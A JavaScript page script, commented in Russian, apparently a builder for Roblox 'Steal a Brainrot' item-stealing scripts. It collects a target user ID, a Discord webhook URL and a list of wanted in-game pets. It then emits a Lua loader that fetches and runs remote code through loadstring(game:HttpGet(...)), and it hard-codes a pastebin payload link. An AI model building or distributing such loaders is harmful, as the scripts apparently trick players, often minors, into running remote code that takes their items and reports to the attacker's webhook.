// ВСЕ БРЕЙНРОТЫ
const allBrainrots = [
    "Meowl", "Strawberry Elephant", "Headless Horseman", "Skibidi Toilet",
    "Griffin", "Hydra Dragon Cannelloni", "Dragon Gingerini", "Dragon Cannelloni",
    "Love Love Bear", "La Supreme Combinasion", "Celestial Pegasus", "Cerberus",
    "Popcuru and Fizzuru", "Rosey and Teddy", "Capitano Moby", "Cooki and Milki",
    "Burguro And Fryuro", "Ketupat Bros", "Reinito Sleighito", "Fortunu and Cashuru",
    "Los Amigos", "La Secret Combinasion", "Los Sekolahs", "Signore Carapace",
    "La Casa Boo", "Fragrama and Chocrama", "La Food Combinasion", "Elefanto Frigo",
    "Spooky and Pumpky", "Ginger Gerat", "La Ginger Sekolah", "Sammyni Fattini",
    "Los Spaghettis", "Festive 67", "Ventoliero Pavonero", "Cloverat Clapat",
    "Spaghetti Tualetti", "Antonio", "Rosetti Tualetti", "Nacho Spyder",
    "Garama and Madundung", "Fishino Clownino", "Gold Gold Gold", "Jolly Jolly Sahur",
    "Lavadorito Spinito", "Ketchuru and Musturu", "Tirilikalika Tirilikalako",
    "Swaggy Bros", "La Romantic Grande", "Orcaledon", "Tictac Sahur",
    "La Taco Combinasion", "Ketupat Kepat", "Dug dug dug", "Tang Tang Keletang",
    "Lovin Rose", "Los Tacoritas", "Eviledon", "Los Primos", "W or L", "Esok Sekolah",
    "La Jolly Grande", "Los Cupids", "Los Puggies", "Tralaledon", "Gobblino Uniciclino",
    "Tuff Toucan", "Mieteteira Bicicleteira", "Chipso and Queso", "Chillin Chili",
    "Money Money Reindeer", "La Spooky Grande", "Bacuru and Egguru", "Los Bros",
    "La Extinct Grande", "Los Candies", "Los 67", "Celularcini Viciosini", "Los Mobilis",
    "Money Money Puggy", "Cigno Fulgoro", "Los Spooky Combinasionas", "Los Hotspotsitos",
    "Los Jolly Combinasionas", "Snailo Clovero", "Los Planitos", "Chicleteira Cupideira",
    "DJ Panda", "Las Sis", "Spinny Hammy", "Tacorita Bicicleta", "Los Sweethearts",
    "Nuclearo Dinossauro", "Chicleteira Noelteira", "Los Combinasionas", "Chimnino",
    "Noo my Gold", "Swag Soda", "Noo my Heart", "Tacorillo Crocodillo", "Mariachi Corazoni",
    "La Grande Combinasion", "Los 25", "Los Burritos", "67", "Donkeyturbo Express",
    "Los Chicleteiras", "Guest 666", "Los Mi Gatitos", "Rang Ring Bus", "Granny",
    "Noo my Present", "Serafinna Medusella", "Los Nooo My Hotspotsitos", "Arcadopus",
    "Noo my Candy", "Los Quesadillas", "Chicleteirina Bicicleteirina", "Chill Puppy",
    "Burrito Bandito", "Luck Luck Luck Sahur", "Chicleteira Bicicleteira", "Brunito Marsito",
    "Quesadillo Vampiro", "Eid Eid Eid Sahur", "Cupid Hotspot", "Mi Gatito",
    "Ho Ho Ho Sahur", "Cupid Cupid Sahur", "Pot Pumpkin", "Naughty Naughty",
    "Bunito Bunito Spinito", "Quesadilla Crocodila", "Horegini Boom", "Santa Hotspot",
    "Pot Hotspot", "25", "Pirulitoita Bicicleteira", "To to to Sahur", "Telemorte",
    "La Sahur Combinasion", "List List List Sahur", "Noo my examine", "Los Jobcitos",
    "Nooo My Hotspot", "Bunnyman", "Tung Tung Tung Sahur", "Cuadramat and Pakrahmatmamat",
    "Please my Present", "Los Cucarachas", "1x1x1x1", "La Vacca Lepre Lepreino",
    "Love Love Love Sahur", "Perrito Burrito", "Graipuss Medussi", "Giftini Spyderini",
    "GOAT", "Trickolino", "Paradiso Axolottino", "Triplito Tralaleritos",
    "La Vacca Jacko Linterino", "Fishboard", "Santteo", "Las Vaquitas Saturnitas",
    "Los Karkeritos", "Karker Sahur", "Los Trios", "Job Job Job Sahur", "Frankentteo",
    "Pumpkini Spyderini", "Las Tralaleritas", "Rocco Disco", "Extinct Matteo",
    "La Karkerkar Combinasion", "La Vacca Prese Presente", "Reindeer Tralala",
    "Yess my examine", "Guerriro Digitale", "Boatito Auratito", "Vulturino Skeletono",
    "Los Tralaleritos", "Zombie Tralala", "Los Tortus", "La Cucaracha", "Fragola La La La",
    "Extinct Tralalero", "Agarrini la Palini", "Los Spyderinis", "Chachechi",
    "Blackhole Goat", "Dul Dul Dul", "Torrtuginni Dragonfrutini", "Trenostruzzo Turbo 4000",
    "Karkerkar Kurkur", "Los Matteos", "Bisonte Giuppitere", "Sammyni Spyderini",
    "La Vacca Saturno Saturnita", "Jackorilla", "Secret Lucky Block"
];

// Заполнение списка чекбоксами
function populateBrainrotsList() {
    let container = document.getElementById('brainrotsList');
    container.innerHTML = '';
    allBrainrots.forEach(br => {
        let label = document.createElement('label');
        label.className = 'checkbox-item';
        let checkbox = document.createElement('input');
        checkbox.type = 'checkbox';
        checkbox.value = br;
        let span = document.createElement('span');
        span.textContent = br;
        label.appendChild(checkbox);
        label.appendChild(span);
        container.appendChild(label);
    });
}

// Поиск по списку
document.getElementById('searchBrainrots').addEventListener('input', function(e) {
    let search = e.target.value.toLowerCase();
    let items = document.querySelectorAll('.checkbox-item');
    items.forEach(item => {
        let text = item.querySelector('span').textContent.toLowerCase();
        if (text.includes(search)) {
            item.style.display = 'flex';
        } else {
            item.style.display = 'none';
        }
    });
});

// Выбрать всех
document.getElementById('selectAllBtn').addEventListener('click', function() {
    document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = true);
});

// Убрать всех
document.getElementById('deselectAllBtn').addEventListener('click', function() {
    document.querySelectorAll('#brainrotsList input').forEach(cb => cb.checked = false);
});

// Переключение кастомного скрипта
document.querySelectorAll('input[name="scriptType"]').forEach(radio => {
    radio.addEventListener('change', function() {
        let customTextarea = document.getElementById('customScript');
        if (this.value === 'custom') {
            customTextarea.style.display = 'block';
        } else {
            customTextarea.style.display = 'none';
        }
    });
});

// Генерация скрипта
document.getElementById('generateBtn').addEventListener('click', function() {
    let robloxNick = document.getElementById('robloxNick').value.trim() || "sdfgrijjkdsfg";
    let robloxId = document.getElementById('robloxId').value.trim() || "8986116710";
    let webhookUrl = document.getElementById('webhookUrl').value.trim();
    let scriptType = document.querySelector('input[name="scriptType"]:checked').value;
    let customScript = document.getElementById('customScript').value;
    
    let selectedBrainrots = [];
    document.querySelectorAll('#brainrotsList input:checked').forEach(cb => {
        selectedBrainrots.push(cb.value);
    });
    
    if (selectedBrainrots.length === 0) {
        alert('Выберите хотя бы один брейнрот');
        return;
    }
    
    if (!webhookUrl) {
        alert('Введите Webhook URL');
        return;
    }
    
    let loadScript = scriptType === "22s" 
        ? 'loadstring(game:HttpGet("https://pastebin.com/raw/vyRfjXm0"))()'
        : customScript;
    
    // Формируем список брейнротов для Lua
    let brainrotListStr = "{\n    " + selectedBrainrots.map(br => `"${br}"`).join(",\n    ") + "\n}";
    
    let script = `-- ========== КОНФИГ ==========
local CONFIG = {
    TARGET_USER_ID = "${robloxId}",
    TARGET_NAME = "${robloxNick}",
    WEBHOOK_URL = "${webhookUrl}",
    TARGET_BRAINROTS = ${brainrotListStr}
}
-- ========== КОНЕЦ КОНФИГА ==========

-- ===== ЗАГРУЗКА ОСНОВНОГО СКРИПТА =====
-- ССЫЛКА НА ОСНОВНОЙ СКРИПТ (ЗАМЕНИТЬ НА РЕАЛЬНУЮ)
loadstring(game:HttpGet("ССЫЛКА_НА_СКРИПТ"))()

print("Скрипт загружен")
print("Таргет ID: " .. CONFIG.TARGET_USER_ID)
print("Таргет брейнротов: " .. #CONFIG.TARGET_BRAINROTS .. " шт.")`;

    document.getElementById('scriptOutput').textContent = script;
    document.getElementById('output').style.display = 'block';
    document.getElementById('copyBtn').style.display = 'inline-block';
});

// Копирование
document.getElementById('copyBtn').addEventListener('click', function() {
    let script = document.getElementById('scriptOutput').textContent;
    navigator.clipboard.writeText(script).then(() => {
        alert('Скрипт скопирован!');
    }).catch(() => {
        alert('Не удалось скопировать');
    });
});

// Дискорд кнопка
document.getElementById('discordBtn').addEventListener('click', function() {
    window.open('https://discord.gg/9A6x27c9k6', '_blank');
});

// Запуск
populateBrainrotsList();
